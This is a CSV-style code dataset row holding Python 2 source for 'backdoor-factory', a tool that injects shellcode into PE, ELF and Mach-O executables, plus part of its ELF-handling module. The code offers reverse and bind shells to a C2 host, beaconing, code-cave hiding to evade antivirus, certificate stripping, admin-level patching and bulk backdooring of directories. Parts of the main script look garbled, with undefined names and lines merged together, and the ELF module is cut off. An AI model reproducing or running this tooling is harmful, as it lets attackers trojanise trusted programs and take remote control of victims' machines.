Program Name,"Code (Limited to 50000 charactes, 1000 lines)"
backdoor-factory,"
import sys
import os
import signal
import time
from random import choice
from optparse import OptionParser
from pebin import pebin
from elfbin import elfbin
from machobin import machobin


def signal_handler(signal, frame):
        print '\nProgram Exit'
        sys.exit(0)


class bdfMain():signal.signal(signal.SIGINT, signal_handler)

    parser = OptionParser()
    parser.add_option(""-f"", ""--file"", dest=""FILE"", action=""store"",
                      type=""string"",
                      help=""File to backdoor"")
    parser.add_option(""-s"", ""--shell"", default=""show"", dest=""SHELL"",
                      action=""store"", type=""string"",
                      help=""Payloads that are available for use.""
                      "" Use 'show' to see payloads.""
                      )
    parser.add_option(""-H"", ""--hostip"", default=None, dest=""HOST"",
                      action=""store"", type=""string"",
                      help=""IP of the C2 for reverse connections."")
    parser.add_option(""-P"", ""--port"", default=None, dest=""PORT"",
                      action=""store"", type=""int"",
                      help=""The port to either connect back to for reverse ""
                      ""shells or to listen on for bind shells"")
    parser.add_option(""-J"", ""--cave_jumping"", dest=""CAVE_JUMPING"",
                      default=False, action=""store_true"",
                      help=""Select this options if you want to use code cave""
                      "" jumping to further hide your shellcode in the binary.""
                      )
    parser.add_option(""-a"", ""--add_new_section"", default=False,
                      dest=""ADD_SECTION"", action=""store_true"",
                      help=""Mandating that a new section be added to the ""
                      ""exe (better success) but less av avoidance"")
    parser.add_option(""-U"", ""--user_shellcode"", default=None,
                      dest=""SUPPLIED_SHELLCODE"", action=""store"",
                      help=""User supplied shellcode, make sure that it matches""
                      "" the architecture that you are targeting.""
                      )
    parser.add_option(""-c"", ""--cave"", default=False, dest=""FIND_CAVES"",
                      action=""store_true"",
                      help=""The cave flag will find code caves that ""
                      ""can be used for stashing shellcode. ""
                      ""This will print to all the code caves ""
                      ""of a specific size.""
                      ""The -l flag can be use with this setting."")
    parser.add_option(""-l"", ""--shell_length"", default=380, dest=""SHELL_LEN"",
                      action=""store"", type=""int"",
                      help=""For use with -c to help find code ""
                      ""caves of different sizes"")
    parser.add_option(""-o"", ""--output-file"", default=None, dest=""OUTPUT"",
                      action=""store"", type=""string"",
                      help=""The backdoor output file"")
    parser.add_option(""-n"", ""--section"", default=""sdata"", dest=""NSECTION"",
                      action=""store"", type=""string"",
                      help=""New section name must be ""
                      ""less than seven characters"")
    parser.add_option(""-d"", ""--directory"", dest=""DIR"", action=""store"",
                      type=""string"",
                      help=""This is the location of the files that ""
                      ""you want to backdoor. ""
                      ""You can make a directory of file backdooring faster by ""
                      ""forcing the attaching of a codecave ""
                      ""to the exe by using the -a setting."")
    parser.add_option(""-w"", ""--change_access"", default=True,
                      dest=""CHANGE_ACCESS"", action=""store_false"",
                      help=""This flag changes the section that houses ""
                      ""the codecave to RWE. Sometimes this is necessary. ""
                      ""Enabled by default. If disabled, the ""
                      ""backdoor may fail."")
    parser.add_option(""-i"", ""--injector"", default=False, dest=""INJECTOR"",
                      action=""store_true"",
                      help=""This command turns the backdoor factory in a ""
                      ""hunt and shellcode inject type of mechanism. Edit ""
                      ""the target settings in the injector module."")
    parser.add_option(""-u"", ""--suffix"", default="".old"", dest=""SUFFIX"",
                      action=""store"", type=""string"",
                      help=""For use with injector, places a suffix""
                      "" on the original file for easy recovery"")
    parser.add_option(""-D"", ""--delete_original"", dest=""DELETE_ORIGINAL"",
                      default=False, action=""store_true"",
                      help=""For use with injector module.  This command""
                      "" deletes the original file.  Not for use in production ""
                      ""systems.  *Author not responsible for stupid uses.*"")
    parser.add_option(""-O"", ""--disk_offset"", dest=""DISK_OFFSET"", default=0,
                      type=""int"", action=""store"",
                      help=""Starting point on disk offset, in bytes. ""
                      ""Some authors want to obfuscate their on disk offset ""
                      ""to avoid reverse engineering, if you find one of those ""
                      ""files use this flag, after you find the offset."")
    parser.add_option(""-S"", ""--support_check"", dest=""SUPPORT_CHECK"",
                      default=False, action=""store_true"",
                      help=""To determine if the file is supported by BDF prior""
                      "" to backdooring the file. For use by itself or with ""
                      ""verbose. This check happens automatically if the ""
                      ""backdooring is attempted.""
                      )
    parser.add_option(""-M"", ""--cave-miner"", dest=""CAVE_MINER"", default=False, action=""store_true"",
                      help=""Future use, to help determine smallest shellcode possible in a PE file""
                      )
    parser.add_option(""-q"", ""--no_banner"", dest=""NO_BANNER"", default=False, action=""store_true"",
                      help=""Kills the banner.""
                      )
    parser.add_option(""-v"", ""--verbose"", default=False, dest=""VERBOSE"",
                      action=""store_true"",
                      help=""For debug information output."")
    parser.add_option(""-T"", ""--image-type"", dest=""IMAGE_TYPE"", default=""ALL"",
                      type='string',
                      action=""store"", help=""ALL, x86, or x64 type binaries only. Default=ALL"")
    parser.add_option(""-Z"", ""--zero_cert"", dest=""ZERO_CERT"", default=True, action=""store_false"",
                      help=""Allows for the overwriting of the pointer to the PE certificate table""
                      "" effectively removing the certificate from the binary for all intents""
                      "" and purposes.""
                      )
    parser.add_option(""-R"", ""--runas_admin"", dest=""RUNAS_ADMIN"", default=False, action=""store_true"",
                      help=""EXPERIMENTAL ""
                      ""Checks the PE binaries for \'requestedExecutionLevel level=\""highestAvailable\""\'""
                      "". If this string is included in the binary, it must run as system/admin. If not ""
                      ""in Support Check mode it will attmept to patch highestAvailable into the manifest ""
                      ""if requestedExecutionLevel entry exists.""
                      )
    parser.add_option(""-L"", ""--patch_dll"", dest=""PATCH_DLL"", default=True, action=""store_false"",
                      help=""Use this setting if you DON'T want to patch DLLs. Patches by default.""
                      )
    parser.add_option(""-F"", ""--fat_priority"", dest=""FAT_PRIORITY"", default=""x64"", action=""store"",
                      help=""For MACH-O format. If fat file, focus on which arch to patch. Default ""
                      ""is x64. To force x86 use -F x86, to force both archs use -F ALL.""
                      )
    parser.add_option(""-B"", ""--beacon"", dest=""BEACON"", default=15, action=""store"", type=""int"",
                      help=""For payloads that have the ability to beacon out, set the time in secs""
                      )
    parser.add_option(""-m"", ""--patch-method"", dest=""PATCH_METHOD"", default=""manual"", action=""store"",
                      type=""string"", help=""Patching methods for PE files, 'manual','automatic', replace ""
                      ""and onionduke"")
    parser.add_option(""-b"", ""--user_malware"", dest=""SUPPLIED_BINARY"", default=None, action=""store"",
                      help=""For onionduke. Provide your desired binary."")
    parser.add_option(""-X"", ""--xp_mode"", dest=""XP_MODE"", default=False, action=""store_true"",
                      help=""Default: DO NOT support for XP legacy machines, use -X to support XP""
                      "". By default the binary will crash on XP machines (e.g. sandboxes)"")
    parser.add_option(""-A"", ""--idt_in_cave"", dest=""IDT_IN_CAVE"", default=False, action=""store_true"",
                      help=""EXPERIMENTAL ""
                      ""By default a new Import Directory Table is created in a new section, ""
                      ""by calling this flag it will be put in a code cave.  This can cause bianry ""
                      ""failure is some cases. Test on target binaries first.""
                      )
    parser.add_option(""-C"",""--code_sign"", dest=""CODE_SIGN"", default=False, action=""store_true"", 
                      help=""For those with codesigning certs wishing to sign PE binaries only. "" 
                      ""Name your signing key and private key signingcert.cer and signingPrivateKey.pem ""
                      ""repectively in the certs directory it's up to you to obtain signing certs."")
    parser.add_option(""-p"",""--preprocess"", dest=""PREPROCESS"", default=False, action=""store_true"", 
                      help=""To execute preprocessing scripts in the preprocess directory"")

    (options, args) = parser.parse_args()

    def basicDiscovery(FILE):
        macho_supported = ['\xcf\xfa\xed\xfe', '\xca\xfe\xba\xbe',
                           '\xce\xfa\xed\xfe',
                           ]

        testBinary = open(FILE, 'rb')
        header = testBinary.read(4)
        testBinary.close()
        if 'MZ' in header:
            return 'PE'
        elif 'ELF' in header:
            return 'ELF'
        elif header in macho_supported:
            return ""MACHO""
        else:
            'Only support ELF, PE, and MACH-O file formats'
            return None

    if options.NO_BANNER is False:
        print choice(menu)
        print author
        print version
        time.sleep(.5)
    else:
        print ""\t Backdoor Factory""
        print author
        print version

    if options.DIR:
        for root, subFolders, files in os.walk(options.DIR):
            for _file in files:
                options.FILE = os.path.join(root, _file)
                if os.path.isdir(options.FILE) is True:
                    print ""Directory found, continuing""
                    continue
                is_supported = basicDiscovery(options.FILE)
                if is_supported is ""PE"":
                    supported_file = pebin(options.FILE,
                                           options.OUTPUT,
                                           options.SHELL,
                                           options.NSECTION,
                                           options.DISK_OFFSET,
                                           options.ADD_SECTION,
                                           options.CAVE_JUMPING,
                                           options.PORT,
                                           options.HOST,
                                           options.SUPPLIED_SHELLCODE,
                                           options.INJECTOR,
                                           options.CHANGE_ACCESS,
                                           options.VERBOSE,
                                           options.SUPPORT_CHECK,
                                           options.SHELL_LEN,
                                           options.FIND_CAVES,
                                           options.SUFFIX,
                                           options.DELETE_ORIGINAL,
                                           options.CAVE_MINER,
                                           options.IMAGE_TYPE,
                                           options.ZERO_CERT,
                                           options.RUNAS_ADMIN,
                                           options.PATCH_DLL,
                                           options.PATCH_METHOD,
                                           options.SUPPLIED_BINARY,
                                           options.XP_MODE,
                                           options.IDT_IN_CAVE,
                                           options.CODE_SIGN,
                                           options.PREPROCESS,
                                           )
                elif is_supported is ""ELF"":
                    supported_file = elfbin(options.FILE,
                                            options.OUTPUT,
                                            options.SHELL,
                                            options.HOST,
                                            options.PORT,
                                            options.SUPPORT_CHECK,
                                            options.FIND_CAVES,
                                            options.SHELL_LEN,
                                            options.SUPPLIED_SHELLCODE,
                                            options.IMAGE_TYPE,
                                            options.PREPROCESS,
                                            )
                elif is_supported is ""MACHO"":
                    supported_file = machobin(options.FILE,
                                              options.OUTPUT,
                                              options.SHELL,
                                              options.HOST,
                                              options.PORT,
                                              options.SUPPORT_CHECK,
                                              options.SUPPLIED_SHELLCODE,
                                              options.FAT_PRIORITY,
                                              options.BEACON,
                                              options.PREPROCESS,
                                              )

                if options.SUPPORT_CHECK is True:
                    if os.path.isfile(options.FILE):
                        is_supported = False
                print ""file"", options.FILE
                try:
                    is_supported = supported_file.support_check()
                except Exception, e:
                    is_supported = False
                    print 'Exception:', str(e), '%s' % options.FILE
                if is_supported is False or is_supported is None:
                    print ""%s is not supported."" % options.FILE
                            #continue
                else:
                    print ""%s is supported."" % options.FILE
                #    if supported_file.flItms['runas_admin'] is True:
                #        print ""%s must be run as admin."" % options.FILE
                print ""*"" * 50

        if options.SUPPORT_CHECK is True:
            sys.exit()

        print (""You are going to backdoor the following ""
               ""items in the %s directory:""
               % options.DIR)
        dirlisting = os.listdir(options.DIR)
        for item in dirlisting:
            print ""     {0}"".format(item)
        answer = raw_input(""Do you want to continue? (yes/no) "")
        if 'yes' in answer.lower():
            for item in dirlisting:
                #print item
                print ""*"" * 50
                options.File = options.DIR + '/' + item
                if os.path.isdir(options.FILE) is True:
                    print ""Directory found, continuing""
                    continue

                print (""backdooring file %s"" % item)
                result = None
                is_supported = basicDiscovery(options.FILE)
                try:
                    if is_supported is ""PE"":
                        supported_file = pebin(options.FILE,
                                               options.OUTPUT,
                                               options.SHELL,
                                               options.NSECTION,
                                               options.DISK_OFFSET,
                                               options.ADD_SECTION,
                                               options.CAVE_JUMPING,
                                               options.PORT,
                                               options.HOST,
                                               options.SUPPLIED_SHELLCODE,
                                               options.INJECTOR,
                                               options.CHANGE_ACCESS,
                                               options.VERBOSE,
                                               options.SUPPORT_CHECK,
                                               options.SHELL_LEN,
                                               options.FIND_CAVES,
                                               options.SUFFIX,
                                               options.DELETE_ORIGINAL,
                                               options.CAVE_MINER,
                                               options.IMAGE_TYPE,
                                               options.ZERO_CERT,
                                               options.RUNAS_ADMIN,
                                               options.PATCH_DLL,
                                               options.PATCH_METHOD,
                                               options.SUPPLIED_BINARY,
                                               options.XP_MODE,
                                               options.IDT_IN_CAVE,
                                               options.CODE_SIGN,
                                               options.PREPROCESS,
                                               )
                        supported_file.OUTPUT = None
                        supported_file.output_options()
                        result = supported_file.patch_pe()
                    elif is_supported is ""ELF"":
                        supported_file = elfbin(options.FILE,
                                                options.OUTPUT,
                                                options.SHELL,
                                                options.HOST,
                                                options.PORT,
                                                options.SUPPORT_CHECK,
                                                options.FIND_CAVES,
                                                options.SHELL_LEN,
                                                options.SUPPLIED_SHELLCODE,
                                                options.IMAGE_TYPE,
                                                options.PREPROCESS,
                                                )

                        supported_file.OUTPUT = None
                        supported_file.output_options()
                        result = supported_file.patch_elf()

                    elif is_supported is ""MACHO"":
                        supported_file = machobin(options.FILE,
                                                  options.OUTPUT,
                                                  options.SHELL,
                                                  options.HOST,
                                                  options.PORT,
                                                  options.SUPPORT_CHECK,
                                                  options.SUPPLIED_SHELLCODE,
                                                  options.FAT_PRIORITY,
                                                  options.BEACON,
                                                  options.PREPROCESS,
                                                  )
                        supported_file.OUTPUT = None
                        supported_file.output_options()
                        result = supported_file.patch_macho()

                    if result is None:
                        print 'Not Supported. Continuing'
                        continue
                    else:
                        print (""[*] File {0} is in backdoored ""
                               ""directory"".format(supported_file.FILE))
                except Exception as e:
                    print ""DIR ERROR"", str(e)
        else:
            print(""Goodbye"")

        sys.exit()

    if options.INJECTOR is True:
        supported_file = pebin(options.FILE,
                               options.OUTPUT,
                               options.SHELL,
                               options.NSECTION,
                               options.DISK_OFFSET,
                               options.ADD_SECTION,
                               options.CAVE_JUMPING,
                               options.PORT,
                               options.HOST,
                               options.SUPPLIED_SHELLCODE,
                               options.INJECTOR,
                               options.CHANGE_ACCESS,
                               options.VERBOSE,
                               options.SUPPORT_CHECK,
                               options.SHELL_LEN,
                               options.FIND_CAVES,
                               options.SUFFIX,
                               options.CAVE_MINER,
                               options.DELETE_ORIGINAL,
                               options.IMAGE_TYPE,
                               options.ZERO_CERT,
                               options.RUNAS_ADMIN,
                               options.PATCH_DLL,
                               options.PATCH_METHOD,
                               options.SUPPLIED_BINARY,
                               options.XP_MODE,
                               options.IDT_IN_CAVE,
                               options.CODE_SIGN,
                               options.PREPROCESS,
                               )
        supported_file.injector()
        sys.exit()

    if not options.FILE:
        parser.print_help()
        sys.exit()

    #OUTPUT = output_options(options.FILE, options.OUTPUT)
    is_supported = basicDiscovery(options.FILE)
    if is_supported is ""PE"":
        supported_file = pebin(options.FILE,
                               options.OUTPUT,
                               options.SHELL,
                               options.NSECTION,
                               options.DISK_OFFSET,
                               options.ADD_SECTION,
                               options.CAVE_JUMPING,
                               options.PORT,
                               options.HOST,
                               options.SUPPLIED_SHELLCODE,
                               options.INJECTOR,
                               options.CHANGE_ACCESS,
                               options.VERBOSE,
                               options.SUPPORT_CHECK,
                               options.SHELL_LEN,
                               options.FIND_CAVES,
                               options.SUFFIX,
                               options.DELETE_ORIGINAL,
                               options.CAVE_MINER,
                               options.IMAGE_TYPE,
                               options.ZERO_CERT,
                               options.RUNAS_ADMIN,
                               options.PATCH_DLL,
                               options.PATCH_METHOD,
                               options.SUPPLIED_BINARY,
                               options.XP_MODE,
                               options.IDT_IN_CAVE,
                               options.CODE_SIGN,
                               options.PREPROCESS,
                               )
    elif is_supported is ""ELF"":
        supported_file = elfbin(options.FILE,
                                options.OUTPUT,
                                options.SHELL,
                                options.HOST,
                                options.PORT,
                                options.SUPPORT_CHECK,
                                options.FIND_CAVES,
                                options.SHELL_LEN,
                                options.SUPPLIED_SHELLCODE,
                                options.IMAGE_TYPE,
                                options.PREPROCESS,
                                )

    elif is_supported is ""MACHO"":
        supported_file = machobin(options.FILE,
                                  options.OUTPUT,
                                  options.SHELL,
                                  options.HOST,
                                  options.PORT,
                                  options.SUPPORT_CHECK,
                                  options.SUPPLIED_SHELLCODE,
                                  options.FAT_PRIORITY,
                                  options.BEACON,
                                  options.PREPROCESS,
                                  )

    else:
        print ""Not supported.""
        sys.exit()
    result = supported_file.run_this()
    if result is True and options.SUPPORT_CHECK is False and supported_file.OUTPUT is not None:
        print ""File {0} is in the 'backdoored' directory"".format(os.path.basename(supported_file.OUTPUT))

    #END BDF MAIN

if __name__ == ""__main__"":

    bdfMain()"
elfbin,"import struct
import os
import shutil
import sys
import tempfile
from intel.LinuxIntelELF32 import linux_elfI32_shellcode
from intel.LinuxIntelELF64 import linux_elfI64_shellcode
from intel.FreeBSDIntelELF32 import freebsd_elfI32_shellcode
#from intel.FreeBSDIntelELF64 import freebsd_elfI64_shellcode
from arm.LinuxARMLELF32 import linux_elfarmle32_shellcode


class elf():
    """"""
    ELF data format class for BackdoorFactory.
    We don't need the ENTIRE format.
    """"""

    #setting linux header infomation
    e_ident = {""EI_MAG"": ""\x7f"" + ""ELF"",
               ""EI_CLASS"": {0x01: ""x86"",
                            0x02: ""x64""
                            },
               ""EI_DATA_little"": 0x01,
               ""EI_DATA_big"": 0x02,
               ""EI_VERSION"": 0x01,
               ""EI_OSABI"": {0x00: ""System V"",
                            0x01: ""HP-UX"",
                            0x02: ""NetBSD"",
                            0x03: ""Linux"",
                            0x06: ""Solaris"",
                            0x07: ""AIX"",
                            0x08: ""IRIX"",
                            0x09: ""FreeBSD"",
                            0x0C: ""OpenBSD""
                            },
               ""EI_ABIVERSION"": 0x00,
               ""EI_PAD"": 0x07
               }

    e_type = {0x01: ""relocatable"",
              0x02: ""executable"",
              0x03: ""shared"",
              0x04: ""core""
              }

    e_machine = {0x02: ""SPARC"",
                 0x03: ""x86"",
                 0x14: ""PowerPC"",
                 0x28: ""ARM"",
                 0x32: ""IA-64"",
                 0x3E: ""x86-64"",
                 0xB7: ""AArch64""
                 }
    e_version = 0x01
#end elf class


class elfbin():
    """"""
    This is the class handler for the elf binary format
    """"""
    def __init__(self, FILE, OUTPUT=None, SHELL=None, HOST=""127.0.0.1"", PORT=8888,
                 SUPPORT_CHECK=False, FIND_CAVES=False, SHELL_LEN=70,
                 SUPPLIED_SHELLCODE=None, IMAGE_TYPE=""ALL"", PREPROCESS=False):
        #print FILE
        self.FILE = FILE
        self.OUTPUT = OUTPUT
        self.SHELL = SHELL
        self.bin_file = None
        self.HOST = HOST
        self.PORT = PORT
        self.FIND_CAVES = FIND_CAVES
        self.SUPPORT_CHECK = SUPPORT_CHECK
        self.SHELL_LEN = SHELL_LEN
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.IMAGE_TYPE = IMAGE_TYPE
        self.shellcode_vaddr = 0x0
        self.PREPROCESS = PREPROCESS
        self.ORIGINAL_FILE = self.FILE
        self.tmp_file = None
        self.keep_temp = False
        self.file_size = os.path.getsize(self.FILE)
        self.supported_types = {0x00:    # System V
                                [[0x01,  # 32bit
                                  0x02   # 64bit
                                  ],
                                 [0x03,  # x86
                                  0x28,  # ARM
                                  0x3E   # x64
                                  ]],
                                0x03:    # Linux
                                [[0x01,  # 32bit
                                  0x02   # 64bit
                                  ],
                                 [0x03,  # x86
                                  0x3E   # x64
                                  ]],
                                0x09:    # FreeBSD
                                [[0x01,  # 32bit
                                 # 0x02  # 64bit
                                  ],
                                 [0x03,  # x86
                                  # 0x3E # x64
                                  ]],
                                0x0C:    # OpenBSD
                                [[0x01,  # 32bit
                                 #0x02   # 64bit
                                  ],
                                 [0x03,  # x86
                                  #0x3E  # x64
                                  ]]
                                }

    def run_this(self):
        '''
        Call this if you want to run the entire process with a ELF binary.
        '''
        #self.print_supported_types()
        self.bin_file = open(self.FILE, ""r+b"")
        if self.FIND_CAVES is True:
            self.support_check()
            self.gather_file_info()
            if self.supported is False:
                print self.FILE, ""is not supported.""
                return False
            print (""Looking for caves with a size of %s ""
                   ""bytes (measured as an integer)""
                   % self.SHELL_LEN)
            self.find_all_caves()
            return True
        if self.SUPPORT_CHECK is True:
            if not self.FILE:
                print ""You must provide a file to see if it is supported (-f)""
                return False
            try:
                self.support_check()
            except Exception, e:
                self.supported = False
                print 'Exception:', str(e), '%s' % self.FILE
            if self.supported is False:
                print ""%s is not supported."" % self.FILE
                self.print_supported_types()
                return False
            else:
                print ""%s is supported."" % self.FILE
                return True

        return self.patch_elf()

    def find_all_caves(self):
        """"""
        This function finds all the codecaves in a inputed file.
        Prints results to screen. Generally not many caves in the ELF
        format.  And why there is no need to cave jump.
        """"""

        print ""[*] Looking for caves""
        SIZE_CAVE_TO_FIND = 94
        BeginCave = 0
        Tracking = 0
        count = 1
        caveTracker = []
        caveSpecs = []
        self.bin_file.seek(0)
        while True:
            try:
                s = struct.unpack(""<b"", self.bin_file.read(1))[0]
            except:
                break
            if s == 0:
                if count == 1:
                    BeginCave = Tracking
                count += 1
            else:
                if count >= SIZE_CAVE_TO_FIND:
                    caveSpecs.append(BeginCave)
                    caveSpecs.append(Tracking)
                    caveTracker.append(caveSpecs)
                count = 1
                caveSpecs = []

            Tracking += 1

        for caves in caveTracker:

            for section in self.sec_hdr.iteritems():
                #print 'section', section[1]
                section = section[1]
                sectionFound = False
                if caves[0] >= section['sh_offset'] and caves[1] <= (section['sh_size'] + section['sh_offset']) and \
                   caves[1] - caves[0] >= SIZE_CAVE_TO_FIND:
                    print ""We have a winner:"", section['name']
                    print '->Begin Cave', hex(caves[0])
                    print '->End of Cave', hex(caves[1])
                    print 'Size of Cave (int)', caves[1] - caves[0]
                    print 'sh_size', hex(section['sh_size'])
                    print 'sh_offset', hex(section['sh_offset'])
                    print 'End of Raw Data:', hex(section['sh_size'] + section['sh_offset'])
                    print '*' * 50
                    sectionFound = True
                    break
            if sectionFound is False:
                try:
                    print ""No section""
                    print '->Begin Cave', hex(caves[0])
                    print '->End of Cave', hex(caves[1])
                    print 'Size of Cave (int)', caves[1] - caves[0]
                    print '*' * 50
                except Exception as e:
                    print str(e)
        print ""[*] Total of %s caves found"" % len(caveTracker)

    def loadthis(self, amod):
        section = amod.split('.')
        mod = ""."".join(section[:-1])
        amod = __import__(mod)
        for item in section[1:]:
            amod = getattr(amod, item)
        return amod

    def preprocess(self):
        # files in directory
        ignore = ['__init__.py']
        abspath = os.path.abspath(__file__)
        dname = os.path.dirname(abspath)
        sys.path.append(dname)
        for afile in os.listdir(dname + ""/preprocessor""):
            if afile in ignore:
                continue
            if "".pyc"" in afile:
                continue
            
            if len(afile.split(""."")) > 2:
                print ""!"" * 50
                print ""\t[!] Make sure there are no '.' in your preprocessor filename:"", afile
                print ""!"" * 50
                
                return False
            
            name = ""preprocessor."" +  afile.strip("".py"")
            
            preprocessor_name = __import__( name, fromlist=[''])
            
            if preprocessor_name.enabled is True:
                print ""[*] Executing preprocessor:"", afile.strip("".py"")
            else:
                continue

            if preprocessor_name.file_format.lower() in ['elf', 'all']: #'elf', 'macho', 'mach-o']:
                print '[*] Running preprocessor', afile.strip("".py""), ""against"", preprocessor_name.file_format, ""formats""
            else:
                continue
            
            # Allow if any processors to keep it 
            if self.keep_temp is False:
                self.keep_temp = preprocessor_name.keep_temp
            
            # create tempfile here always
            
            if self.tmp_file == None:
                self.tmp_file = tempfile.NamedTemporaryFile()
                self.tmp_file.write(open(self.FILE, 'rb').read())
                self.tmp_file.seek(0)
                print ""[*] Creating temp file:"", self.tmp_file.name
            else:
                print ""[*] Using existing tempfile from prior preprocessor""
            
            load_name = name +  "".preprocessor""
            preproc = self.loadthis(load_name)
            
            m = preproc(self)
            
            print ""="" * 50
            
            # execute preprocessor
            result = m.run()
            
            if result is False:
                print ""[!] Preprocessor Failure :(""

            print ""="" * 50
            
            # After running push it to BDF.
            
            self.FILE = self.tmp_file.name[:]
    
            # check for support after each modification
            if preprocessor_name.recheck_support is True:
                issupported = self.support_check()
                if issupported is False:
                    print self.FILE, ""is not supported.""
                    return False                

    def set_shells(self):
        """"""
        This function sets the shellcode.
        """"""

        avail_shells = []

        self.bintype = False
        if self.e_machine == 0x03:  # x86 chipset
            if self.EI_CLASS == 0x1:
                if self.EI_OSABI == 0x00:
                    self.bintype = linux_elfI32_shellcode
                elif self.EI_OSABI == 0x09 or self.EI_OSABI == 0x0C:
                    self.bintype = freebsd_elfI32_shellcode
        elif self.e_machine == 0x3E:  # x86-64 chipset
            if self.EI_CLASS == 0x2:
                if self.EI_OSABI == 0x00:
                    self.bintype = linux_elfI64_shellcode
                elif self.EI_OSABI == 0x03:
                    self.bintype = linux_elfI64_shellcode
                #elif self.EI_OSABI == 0x09:
                #    self.bintype = freebsd_elfI64_shellcode
        elif self.e_machine == 0x28:  # ARM chipset
            if self.EI_CLASS == 0x1:
                if self.EI_OSABI == 0x00:
                    self.bintype = linux_elfarmle32_shellcode

        if self.bintype is False:
            print ""[!] Unusual binary type""
            return False

        if not self.SHELL:
            print ""You must choose a backdoor to add: ""
            for item in dir(self.bintype):
                if ""__"" in item:
                    continue
                elif (""returnshellcode"" == item
                      or ""pack_ip_addresses"" == item
                      or ""eat_code_caves"" == item
                      or 'ones_compliment' == item
                      or 'resume_execution' in item
                      or 'returnshellcode' in item):
                    continue
                else:
                    print ""   {0}"".format(item)
            return False
        if self.SHELL not in dir(self.bintype):
            print ""The following %ss are available:"" % str(self.bintype).split(""."")[1]
            for item in dir(self.bintype):
                #print item
                if ""__"" in item:
                    continue
                elif (""returnshellcode"" == item
                      or ""pack_ip_addresses"" == item
                      or ""eat_code_caves"" == item
                      or 'ones_compliment' == item
                      or 'resume_execution' in item
                      or 'returnshellcode' in item):
                    continue
                else:
                    print ""   {0}"".format(item)
                    avail_shells.append(item)
            self.avail_shells = avail_shells
            return False
        #else:
        #    shell_cmd = self.SHELL + ""()""
        if self.e_machine == 0x28:
            self.shells = self.bintype(self.HOST, self.PORT, self.e_entry, self.SUPPLIED_SHELLCODE, self.shellcode_vaddr)
        else:
            self.shells = self.bintype(self.HOST, self.PORT, self.e_entry, self.SUPPLIED_SHELLCODE)
        self.allshells = getattr(self.shells, self.SHELL)(self.e_entry)
        self.shellcode = self.shells.returnshellcode()

    def print_supported_types(self):
        """"""
        Prints supported types
        """"""
        print ""Supported system types:""
        for system_type in self.supported_types.iteritems():
            print ""    "", elf.e_ident[""EI_OSABI""][system_type[0]]
            print ""     Arch type:""
            for class_type in system_type[1][0]:
                print ""\t"", elf.e_ident['EI_CLASS'][class_type]
            print ""     Chip set:""
            for e_mach_type in system_type[1][1]:
                print ""\t"", elf.e_machine[e_mach_type]
            #print ""Supported class types:""
            print ""*"" * 25

    def support_check(self):
        """"""
        Checks for support
        """"""
        with open(self.FILE, 'r+b') as bin_file:
            print ""[*] Checking file support""
            bin_file.seek(0)
            if bin_file.read(4) == elf.e_ident[""EI_MAG""]:
                bin_file.seek(4, 0)
                self.class_type = struct.unpack(""<B"", bin_file.read(1))[0]
                bin_file.seek(7, 0)
                self.EI_OSABI = struct.unpack(""<B"", bin_file.read(1))[0]
                self.supported = False
                for system_type in self.supported_types.iteritems():
                    if self.EI_OSABI == system_type[0]:
                        print ""[*] System Type Supported:"", elf.e_ident[""EI_OSABI""][system_type[0]]
                        if self.class_type == 0x1 and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x86'):
                            self.supported = True
                        elif self.class_type == 0x2 and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x64'):
                            self.supported = True
                        break

            else:
                self.supported = False

    def get_section_name(self, section_offset):
        """"""
        Get section names
        """"""
        if self.e_shstrndx not in self.sec_hdr:
            print ""[!] Failed to get self.e_shstrndx. Fuzzing?""
            return False
        if self.sec_hdr[self.e_shstrndx]['sh_offset'] > self.file_size:
            print ""[!] Fuzzing the sh_offset""
            return False
        self.bin_file.seek(self.sec_hdr[self.e_shstrndx]['sh_offset'] + section_offset, 0)
        name = ''
        j = ''
        while True:
            j = self.bin_file.read(1)
            if len(j) == 0:
                break
            elif j == ""\x00"":
                break
            else:
                name += j
        #print ""name:"", name
        return name

    def set_section_name(self):
        """"""
        Set the section names
        """"""
         #how to find name section specifically
        for i in range(0, self.e_shstrndx + 1):
            self.sec_hdr[i]['name'] = self.get_section_name(self.sec_hdr[i]['sh_name'])
            if self.sec_hdr[i]['name'] is False:
                print ""Failure in naming, fuzzing?""
                return False
        if self.sec_hdr[i]['name'] == "".text"":
                #print ""Found text section""
                self.text_section = i

    def gather_file_info(self):
        '''
        Gather info about the binary
        '''
        print ""[*] Gathering file info""
        bin = self.bin_file
        bin.seek(0)
        EI_MAG = bin.read(4)
        self.EI_CLASS = struct.unpack(""<B"", bin.read(1))[0]
        self.EI_DATA = struct.unpack(""<B"", bin.read(1))[0]
        if self.EI_DATA == 0x01:
            #little endian
            self.endian = ""<""
        else:
            #big self.endian
            self.endian = "">""
        self.EI_VERSION = struct.unpack('<B', bin.read(1))[0]
        self.EI_OSABI = struct.unpack('<B', bin.read(1))[0]
        self.EI_ABIVERSION = struct.unpack('<B', bin.read(1))[0]
        self.EI_PAD = struct.unpack(self.endian + ""BBBBBBB"", bin.read(7))[0]
        self.e_type = struct.unpack(self.endian + ""H"", bin.read(2))[0]
        self.e_machine = struct.unpack(self.endian + ""H"", bin.read(2))[0]
        self.e_version = struct.unpack(self.endian + ""I"", bin.read(4))[0]
        #print ""EI_Class"", self.EI_CLASS
        if self.EI_CLASS == 0x01:
            #""32 bit ""
            self.e_entryLocOnDisk = bin.tell()
            self.e_entry = struct.unpack(self.endian + ""I"", bin.read(4))[0]
            #print hex(self.e_entry)
            self.e_phoff = struct.unpack(self.endian + ""I"", bin.read(4))[0]
            self.e_shoff = struct.unpack(self.endian + ""I"", bin.read(4))[0]
        else:
            #""64 bit ""
            self.e_entryLocOnDisk = bin.tell()
            self.e_entry = struct.unpack(self.endian + ""Q"", bin.read(8))[0]
            self.e_phoff = struct.unpack(self.endian + ""Q"", bin.read(8))[0]
            self.e_shoff = struct.unpack(self.endian + ""Q"", bin.read(8))[0]
        self.VrtStrtngPnt = self.e_entry
        self.e_flags = struct.unpack(self.endian + ""I"", bin.read(4))[0]
        self.e_ehsize = struct.unpack(self.endian + ""H"", bin.read(2))[0]
        self.e_phentsize = struct.unpack(self.endian + ""H"", bin.read(2))[0]
        self.e_phnum = struct.unpack(self.endian + ""H"", bin.read(2))[0]
        self.e_shentsize = struct.unpack(self.endian + ""H"", bin.read(2))[0]
        self.e_shnum = struct.unpack(self.endian + ""H"", bin.read(2))[0]
        self.e_shstrndx = struct.unpack(self.endian + ""H"", bin.read(2))[0]
        
